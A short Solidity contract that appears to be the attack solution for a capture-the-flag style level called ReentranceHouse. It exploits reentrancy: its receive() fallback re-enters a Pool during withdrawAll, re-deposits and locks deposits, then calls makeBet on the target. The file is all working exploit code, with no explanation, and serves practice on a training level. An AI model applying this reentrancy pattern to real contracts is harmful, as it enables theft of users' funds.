// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../levels/ReentranceHouse.sol";

contract ReentranceHouseAttack {
    ReentranceHouse target;
    Pool pool;
    PoolToken depositToken;

    constructor(address payable _target) payable {
        target = ReentranceHouse(_target);
    }

    function setNeededParameters(
        address payable _pool,
        address _depositToken
    ) external {
        pool = Pool(_pool);
        depositToken = PoolToken(_depositToken);
    }

    function attack() external payable {
        depositToken.approve(address(pool), 5);
        pool.deposit{value: 0.001 ether}(5);
        pool.withdrawAll();
    }

    receive() external payable {
        // approve
        depositToken.approve(address(pool), 5);
        pool.deposit(5);
        pool.lockDeposits();
        target.makeBet(tx.origin);
    }
}
